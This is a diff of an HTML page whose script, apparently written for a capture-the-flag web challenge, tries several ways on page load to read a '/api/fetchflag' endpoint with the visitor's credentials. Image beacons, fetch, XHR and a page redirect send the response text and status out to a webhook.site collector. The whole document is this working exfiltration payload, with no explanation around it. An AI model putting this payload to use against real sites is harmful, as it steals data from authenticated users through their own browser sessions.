@@ -2,13 +2,95 @@
 <html>
 <body>
 <script>
-// Test XMLHttpRequest with credentials
-var x = new XMLHttpRequest();
-x.open('GET', 'http://95.217.6.37:20001/api/fetchflag', false);
-x.withCredentials = true;
-x.send();
-var img = new Image();
-img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?xhr_status=' + x.status + '&length=' + x.responseText.length;
+// Track which methods work
+var results = [];
+
+// Method 1: Simple Image Beacon (most reliable)
+try {
+    var img1 = new Image();
+    img1.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=image_beacon&time=' + Date.now();
+    results.push('image_beacon:attempted');
+} catch(e) {
+    results.push('image_beacon:failed-' + e.message);
+}
+
+// Method 2: Fetch to webhook
+try {
+    fetch('https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: 'fetch_post_works'
+    }).then(() => results.push('fetch_post:success')).catch(e => results.push('fetch_post:failed'));
+} catch(e) {
+    results.push('fetch_post:failed-' + e.message);
+}
+
+// Method 3: Navigate to webhook after delay
+setTimeout(() => {
+    try {
+        window.location = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?method=navigation&time=' + Date.now();
+    } catch(e) {
+        // Ignore navigation errors
+    }
+}, 2000);
+
+// Method 4: Try to fetch the flag API
+setTimeout(() => {
+    try {
+        // Try without credentials first
+        fetch('http://95.217.6.37:20001/api/fetchflag')
+        .then(r => r.text())
+        .then(txt => {
+            var img = new Image();
+            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_no_creds=' + encodeURIComponent(txt.substring(0, 50));
+        })
+        .catch(e => {
+            // Then try with credentials
+            fetch('http://95.217.6.37:20001/api/fetchflag', {credentials: 'include'})
+            .then(r => r.text())
+            .then(txt => {
+                var img = new Image();
+                img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_with_creds=' + encodeURIComponent(txt.substring(0, 50));
+            })
+            .catch(e2 => {
+                var img = new Image();
+                img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?api_both_failed=' + encodeURIComponent(e2.toString());
+            });
+        });
+    } catch(e) {
+        results.push('api_fetch:failed-' + e.message);
+    }
+}, 500);
+
+// Method 5: XMLHttpRequest as fallback
+setTimeout(() => {
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://95.217.6.37:20001/api/fetchflag', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            var img = new Image();
+            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?xhr_success=' + this.status;
+        };
+        xhr.onerror = function() {
+            var img = new Image();
+            img.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?xhr_error=true';
+        };
+        xhr.send();
+    } catch(e) {
+        results.push('xhr:failed-' + e.message);
+    }
+}, 1000);
+
+// Final results beacon
+setTimeout(() => {
+    try {
+        var finalImg = new Image();
+        finalImg.src = 'https://webhook.site/e600413c-4e6f-4338-8d5a-119b46c59825?final_results=' + encodeURIComponent(results.join(','));
+    } catch(e) {
+        // Ignore final errors
+    }
+}, 3000);
 </script>
 </body>
 </html>
